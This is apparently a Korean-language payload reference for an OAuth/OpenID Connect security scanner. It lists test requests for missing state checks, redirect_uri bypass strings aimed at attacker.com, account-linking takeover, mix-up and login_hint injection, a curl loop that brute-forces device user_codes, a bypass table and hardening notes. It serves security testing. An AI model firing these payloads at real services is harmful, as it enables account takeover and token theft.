### 기본 페이로드

**state 검증** (`STATE_MISSING`/`STATE_WEAK_STORAGE` 라벨):
```
# baseline (잘못된 state → 거부 확인)
GET /auth/callback?code=test&state=wrongstate  Cookie: SESSION

# state 제거
GET /auth/callback?code=test  Cookie: SESSION

# state 빈 값
GET /auth/callback?code=test&state=  Cookie: SESSION

# 다른 사용자 state (세션 외 저장 시)
GET /auth/callback?code=test&state=ATTACKER_STATE  Cookie: VICTIM_SESSION
```

**1단계 검증 우회 확인 시 → 2단계 (유효 인가 코드 + 전체 체인 검증)** — 사용자에게 유효 코드 요청
```
GET /auth/callback?code=VALID_CODE&state=  Cookie: SESSION
# 토큰 발급 + 세션 생성 시 확인됨
```

**redirect_uri 우회** (`REDIRECT_URI_LOOSE` 라벨):
- `https://allowed.com/callback/../../attacker` (path traversal)
- `https://allowed.com/callback%2f..%2f..%2fattacker`
- `https://attacker.allowed.com/callback` (서브도메인)
- `https://allowed.com/callback?next=https://attacker.com` (open-redirect 결합)
- `https://allowed.com/callback#@attacker.com` (fragment trick)
- `https://allowed.com%40attacker.com` (URL 인코딩 + @)
- `https://allowed.com\\@attacker.com` (백슬래시)
- `https://allowed.com:80@attacker.com` (port + @)

**PKCE 미적용** (`PKCE_MISSING` 라벨):
```
# 모바일/SPA에서 code_challenge 누락
GET /authorize?response_type=code&client_id=X&redirect_uri=...&scope=...
# (code_challenge/code_challenge_method 없이 발급되면 PKCE 미강제)
```

**id_token 검증** (`IDTOKEN_VALIDATION` 라벨):
- jwt-scanner 결합 — alg none, RS256↔HS256 confusion, jku/jwk/kid 변조

**Account linking** (`ACCOUNT_TAKEOVER` 라벨):
```
# 1. attacker가 자체 발행 IdP에 victim@email로 계정 생성 (verified=false)
# 2. account linking endpoint 호출
POST /api/account/link  Authorization: Bearer ATTACKER_TOKEN
{"provider":"custom_idp", "external_email":"victim@target.com"}
# → victim 계정 연결 성공 시 takeover
```

**Implicit Flow** (`IMPLICIT` 라벨):
```
# response_type=token (deprecated)
GET /authorize?response_type=token&client_id=X&redirect_uri=...
# fragment에 access_token 노출 시 → IMPLICIT 잔존
```

#### Mix-up attack (다중 IdP)
```
# 다중 IdP 환경에서 IdP 응답을 다른 IdP로 속임
GET /callback?code=...&iss=https://OTHER_IDP.com&state=...
# iss 검증 누락 시 다른 IdP의 코드를 본 IdP 코드로 처리
```

#### Authorization endpoint 파라미터 인젝션
```
# prompt=none + login_hint 인젝션
GET /authorize?client_id=X&redirect_uri=...&prompt=none&login_hint=victim@x.com
# 사용자 동의 화면 우회 시도
```

#### Covert redirect (RFC 6749 §10.15)
```
# 동의 후 redirect_uri fragment에 token 노출
GET /authorize?response_type=token&client_id=X&redirect_uri=https://allowed.com/cb#evil
```

#### Device Authorization Grant (RFC 8628) user_code brute force
```
# user_code가 짧고 추측 가능 시
for code in $(seq 100000 999999); do
  curl -X POST "https://target/oauth/device/verify" -d "user_code=$code"
done
```

#### Token introspection cache
```
# 폐기된 토큰이 cache로 유효 유지
POST /token/revoke  ... (토큰 폐기)
GET /api/x  Authorization: Bearer REVOKED_TOKEN  ← 여전히 200
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `redirect_uri` prefix 매칭 | path traversal `/cb/../../evil`, `@`, `#`, `?` |
| `state` 예측 가능 (timestamp/sequential) | 동일 값 예측 후 강제 |
| `state` cookie 저장 | 공격자 cookie 주입 가능 시 양쪽 제어 |
| PKCE S256 + 약한 verifier | `Math.random()` 같은 약한 난수 → brute force |
| id_token `iss` 검증 + `aud` 누락 | 다른 client용 토큰 재사용 |
| Account linking + 이메일 verified 체크 | 자체 발행 IdP의 verified flag 신뢰 불가 |
| Persisted refresh token | rotation 없으면 탈취 후 영구 |
| `redirect_uri` strict + `?` 누락 | query string 추가 (`?evil=1`)로 우회 |
| Authorization request만 검증, token request 미검증 | 두 요청 모두 redirect_uri 검증 필수 |

---

### 참고사항

- state 검증은 1단계만으로 결정 금지 — 반드시 2단계 (유효 코드 + 전체 체인) 검증
- 유효 인가 코드는 일회용/수분 만료 — 사용자에게 즉시 사용 안내
- PKCE는 모바일/SPA에서 RFC 7636 권고 — public client는 필수
- `redirect_uri`는 authorization request와 token request 양쪽에 검증 필수 (RFC 6749)
- Account linking 시 IdP의 `email_verified` 플래그가 자체 발행이면 신뢰 불가
- Mix-up attack은 다중 IdP 환경 — `iss` 검증으로 방어
- FAPI (금융권) 환경은 PAR/JARM 같은 추가 강화 요구
- DPoP token binding 적용 시 탈취 토큰 단독 사용 불가
- Refresh token rotation 없으면 탈취 시 영구 — short TTL + rotation 권장
- Implicit Flow는 OAuth 2.1에서 deprecated — Code Flow + PKCE 권장
- Device Authorization Grant의 user_code는 짧으면 brute force 가능 — rate limit 필수
- Token introspection 결과 cache는 짧은 TTL (10초 이하) 권장 — 폐기 즉시 반영
- Authorization Server SSRF (`request_uri` parameter)는 별도 영역 — ssrf-scanner 결합
- redirect_uri의 fragment(`#`)는 서버에 전송되지 않지만 클라이언트 후처리 시 영향
- Confidential client (server-side)는 client_secret 노출 시 위험 — public client는 PKCE 대신
